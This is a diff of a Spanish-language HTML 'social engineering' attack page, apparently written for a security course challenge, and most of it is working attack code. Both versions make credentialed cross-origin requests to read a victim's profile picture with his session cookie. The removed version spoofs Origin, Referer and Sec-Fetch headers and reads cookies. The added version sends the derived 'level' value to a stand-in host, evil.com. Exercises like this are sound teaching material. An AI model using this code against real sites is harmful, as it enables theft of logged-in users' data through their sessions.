@@ -1,81 +1,33 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Attacker Page</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/blueimp-md5/2.19.0/js/md5.min.js"></script>
+    <title>Ataque de Ingeniería Social</title>
 </head>
 <body>
-    <h1>Fetching Pepe's Profile Picture</h1>
-    <p>Please log into <a href="https://chl-252b03b2-82ca-46a6-b558-a03090ccae52-imagen-importante.softwareseguro.com.ar/" target="_blank">Imagen Importante</a> to view your profile picture.</p>
-    <iframe src="https://chl-252b03b2-82ca-46a6-b558-a03090ccae52-imagen-importante.softwareseguro.com.ar/" style="display:none;"></iframe>
-    <img id="profilePic" style="display:none;" />
-    <p id="result">Loading...</p>
-    <p id="debug">Debug: Checking session...</p>
-
+    <h1>Haz clic para ver una sorpresa</h1>
     <script>
-        const targetUrl = "https://chl-252b03b2-82ca-46a6-b558-a03090ccae52-imagen-importante.softwareseguro.com.ar/profile-pic";
-        const mainSiteUrl = "https://chl-252b03b2-82ca-46a6-b558-a03090ccae52-imagen-importante.softwareseguro.com.ar/";
-
-        // Check cookies for debugging
-        function checkCookies() {
-            const cookies = document.cookie;
-            return cookies ? `Cookies detected: ${cookies}` : "No cookies detected. Ensure you are logged into Imagen Importante.";
-        }
-
-        // Initial image fetch
-        const img = new Image();
-        img.crossOrigin = "Anonymous"; // Required for cross-origin image loading
-        img.src = targetUrl;
-
-        img.onload = function() {
-            const width = img.width;
-            const height = img.height;
-            const privilegeLevel = width * height;
-            const hash = md5(privilegeLevel.toString()); // Compute MD5 hash
-            let resultText = `Image Dimensions: ${width} x ${height}\nPrivilege Level: ${privilegeLevel}\nMD5 Hash: ${hash}`;
-
-            // Update debug info
-            document.getElementById("debug").innerText = `Debug: ${checkCookies()}`;
-
-            // Send additional GET request to /profile-pic
-            fetch(targetUrl, {
-                method: "GET",
-                headers: {
-                    "Accept": "image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5",
-                    "Accept-Language": "en-US,en;q=0.5",
-                    "Accept-Encoding": "gzip, deflate, br",
-                    "Origin": mainSiteUrl, // Mimic p1's origin
-                    "Referer": mainSiteUrl, // Mimic p1's referer
-                    "Sec-Fetch-Dest": "image",
-                    "Sec-Fetch-Mode": "cors",
-                    "Sec-Fetch-Site": "same-origin", // Try same-origin to bypass checks
-                    "Priority": "u=5, i"
-                },
-                credentials: "include" // Include session cookie
-            })
-            .then(response => {
-                resultText += `\nAdditional GET Request Status: ${response.status} ${response.statusText}`;
-                if (response.status === 302) {
-                    resultText += `\nRedirected to: ${response.headers.get("Location") || "unknown"}`;
-                }
-                document.getElementById("result").innerText = resultText;
-            })
-            .catch(error => {
-                resultText += `\nAdditional GET Request Failed: ${error.message}`;
-                document.getElementById("result").innerText = resultText;
-            });
-
-            document.getElementById("result").innerText = resultText;
-        };
-
-        img.onerror = function() {
-            document.getElementById("result").innerText = "Error loading image. Ensure you are logged into Imagen Importante.";
-            document.getElementById("debug").innerText = `Debug: ${checkCookies()}\nImage fetch failed, likely due to invalid session or server restrictions.`;
-        };
-
-        document.getElementById("profilePic").src = img.src;
+        // Solicitud a /profile-pic para obtener la imagen de Pepe
+        fetch('https://chl-252b03b2-82ca-46a6-b558-a03090ccae52-imagen-importante.softwareseguro.com.ar/profile-pic', {
+            method: 'GET',
+            credentials: 'include' // Incluye la cookie de sesión de Pepe
+        })
+        .then(response => response.blob())
+        .then(blob => {
+            const img = new Image();
+            img.src = URL.createObjectURL(blob);
+            img.onload = () => {
+                const width = img.width;
+                const height = img.height;
+                const level = width * height;
+                // Enviar el nivel a nuestro servidor
+                fetch('https://evil.com/save-level', {
+                    method: 'POST',
+                    body: JSON.stringify({ level: level })
+                });
+                // O calcular el MD5 en el cliente (usando una librería como md5.js)
+                console.log('Nivel de Pepe:', level);
+            };
+        });
     </script>
 </body>
 </html>
